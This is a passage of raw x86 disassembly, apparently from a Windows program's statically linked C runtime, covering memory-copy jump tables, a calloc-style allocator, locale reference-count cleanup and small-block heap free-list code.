  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
